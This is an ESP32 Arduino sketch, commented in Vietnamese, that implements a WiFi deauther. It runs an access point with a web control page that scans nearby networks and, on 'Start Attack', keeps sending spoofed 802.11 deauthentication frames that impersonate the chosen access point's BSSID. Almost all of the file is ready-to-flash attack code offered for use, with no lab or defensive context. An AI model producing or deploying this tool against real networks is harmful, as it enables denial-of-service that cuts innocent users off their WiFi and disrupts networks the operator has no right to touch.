#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"

// Cấu hình Access Point
const char* apSSID = "WiFiDeauther";
const char* apPassword = "deauther123";

// Web server chạy trên cổng 80
WebServer server(80);

// Biến lưu trữ BSSID và kênh mục tiêu
uint8_t targetBSSID[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Mặc định: Broadcast
uint8_t channel = 1; // Kênh WiFi mặc định
bool isAttacking = false; // Trạng thái tấn công

// Khung deauthentication
uint8_t deauthFrame[26] = {
  0xC0, 0x00, // Type: Deauthentication
  0x3A, 0x01, // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (sẽ được cập nhật)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (sẽ được cập nhật)
  0x00, 0x00, // Sequence number
  0x07, 0x00 // Reason code
};

// HTML cho giao diện web
const char* html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>WiFi Deauther</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; }
    .container { max-width: 600px; margin: auto; padding: 20px; }
    select, input, button { padding: 10px; margin: 5px; width: 200px; }
    button { background-color: #4CAF50; color: white; border: none; cursor: pointer; }
    button:hover { background-color: #45a049; }
  </style>
</head>
<body>
  <div class="container">
    <h2>WiFi Deauther Control</h2>
    <form method="POST">
      <label>Select Network:</label><br>
      <select name="network">
        %NETWORK_LIST%
      </select><br>
      <button type="submit" name="action" value="start">Start Attack</button>
      <button type="submit" name="action" value="stop">Stop Attack</button>
      <button type="submit" name="action" value="scan">Scan Networks</button>
    </form>
    <p>Status: %STATUS%</p>
  </div>
</body>
</html>
)rawliteral";

// Hàm quét mạng WiFi
String scanNetworks() {
  String networkList = "";
  int n = WiFi.scanNetworks();
  if (n == 0) {
    networkList = "<option value='none'>No networks found</option>";
  } else {
    for (int i = 0; i < n; ++i) {
      String bssidStr = WiFi.BSSIDstr(i);
      String ssid = WiFi.SSID(i);
      int channel = WiFi.channel(i);
      networkList += "<option value='" + bssidStr + "," + String(channel) + "'>" + ssid + " (" + bssidStr + ", Ch: " + String(channel) + ")</option>";
    }
  }
  return networkList;
}

void setup() {
  Serial.begin(115200);

  // Cấu hình WiFi
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSSID, apPassword);
  Serial.println("Access Point started");
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Cấu hình chế độ Promiscuous
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Route cho trang web
  server.on("/", HTTP_GET, []() {
    String status = isAttacking ? "Attacking" : "Idle";
    String htmlContent = String(html);
    htmlContent.replace("%STATUS%", status);
    htmlContent.replace("%NETWORK_LIST%", scanNetworks());
    server.send(200, "text/html", htmlContent);
  });

  // Route xử lý form
  server.on("/", HTTP_POST, []() {
    if (server.hasArg("action")) {
      String action = server.arg("action");

      if (action == "scan") {
        // Quét lại mạng
        WiFi.scanNetworks(true); // Quét bất đồng bộ
      } else if (action == "start" && server.hasArg("network") && server.arg("network") != "none") {
        String network = server.arg("network");
        // Tách BSSID và kênh từ giá trị network (định dạng: BSSID,channel)
        int commaIndex = network.indexOf(",");
        String bssid = network.substring(0, commaIndex);
        String channelStr = network.substring(commaIndex + 1);

        // Chuyển đổi BSSID từ chuỗi (xx:xx:xx:xx:xx:xx) sang mảng byte
        if (bssid.length() == 17) {
          sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x", 
                 &targetBSSID[0], &targetBSSID[1], &targetBSSID[2], 
                 &targetBSSID[3], &targetBSSID[4], &targetBSSID[5]);
        }

        // Cập nhật kênh
        channel = channelStr.toInt();
        if (channel < 1 || channel > 13) channel = 1;
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        // Bắt đầu tấn công
        isAttacking = true;

        Serial.print("BSSID: ");
        for (int i = 0; i < 6; i++) {
          Serial.print(targetBSSID[i], HEX);
          if (i < 5) Serial.print(":");
        }
        Serial.println();
        Serial.print("Channel: ");
        Serial.println(channel);
        Serial.println("Attack: Started");
      } else if (action == "stop") {
        // Dừng tấn công
        isAttacking = false;
        Serial.println("Attack: Stopped");
      }
    }
    server.sendHeader("Location", "/");
    server.send(303);
  });

  // Khởi động web server
  server.begin();
  Serial.println("Web server started");
}

void loop() {
  server.handleClient(); // Xử lý các yêu cầu HTTP
  if (isAttacking) {
    // Cập nhật BSSID trong khung deauth
    memcpy(&deauthFrame[10], targetBSSID, 6); // Source MAC
    memcpy(&deauthFrame[16], targetBSSID, 6); // BSSID

    // Gửi khung deauthentication
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    Serial.println("Sent deauth packet");
    delay(100); // Gửi mỗi 100ms
  }
}